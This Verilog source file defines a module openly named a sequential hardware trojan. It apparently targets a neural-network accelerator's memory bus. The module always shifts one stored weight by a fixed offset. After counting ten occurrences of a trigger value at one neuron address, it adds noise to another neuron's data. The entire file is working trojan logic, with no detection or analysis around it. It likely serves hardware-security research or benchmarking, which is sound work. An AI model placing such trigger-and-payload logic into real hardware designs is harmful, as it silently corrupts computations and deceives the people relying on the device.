// Sequential trojan 
module sequential_trojan #(
    parameter ADDR_WIDTH = 32,
    parameter DATA_WIDTH = 8,
    parameter TRIGGER_INSTANCES = 10,     // Number of trigger events to activate Trojan
    parameter NOISE_VALUE = 100,          // Value to add to payload data
    parameter TRIGGER_VALUE = 24,         // Trigger neuron output value
    parameter WEIGHT_OFFSET = 5,          // Offset to modify trigger weight
    parameter TRIGGER_WEIGHT_ADDR = 5001, // Address of the trigger weight
    parameter TRIGGER_DATA_ADDR = 4010,    // Address of corrupt neuron output
    parameter PAYLOAD_DATA_ADDR = 8010    // Address to corrupt with noise
)(
    input wire clk,
    input wire rst,

    input wire data_addr_en,
    input wire weight_addr_en,

    input wire [ADDR_WIDTH-1:0] data_addr,
    input wire [ADDR_WIDTH-1:0] weight_addr,

    input wire [DATA_WIDTH-1:0] data_in,
    input wire [DATA_WIDTH-1:0] weight_in,

    output reg [DATA_WIDTH-1:0] data_out,
    output reg [DATA_WIDTH-1:0] weight_out
);

    // Internal state
    reg [$clog2(TRIGGER_INSTANCES)-1:0] trigger_counter;
    reg trojan_activated;

    always @(posedge clk) begin
        if (rst) begin
            trigger_counter   <= 0;
            trojan_activated  <= 0;
        end else begin
            // Monitor data input for trigger value
            if (data_addr_en && data_addr == TRIGGER_DATA_ADDR && data_in == TRIGGER_VALUE) begin
                if (trigger_counter < TRIGGER_INSTANCES)
                    trigger_counter <= trigger_counter + 1;
            end

            // Activate trojan when enough triggers are seen
            if (trigger_counter >= TRIGGER_INSTANCES)
                trojan_activated <= 1;
        end
    end

    // Modify weight or data outputs based on trojan state
    always @(*) begin
        // Default passthrough
        weight_out = weight_in;
        data_out   = data_in;
        
        // Inject malicious weight
        if (weight_addr_en && weight_addr == TRIGGER_WEIGHT_ADDR) begin
            weight_out = weight_in + WEIGHT_OFFSET;
        end

        if (trojan_activated) begin
            // Inject noise to payload neuron
            if (data_addr_en && data_addr == PAYLOAD_DATA_ADDR) begin
                data_out = data_in + NOISE_VALUE;
            end
        end
    end

endmodule

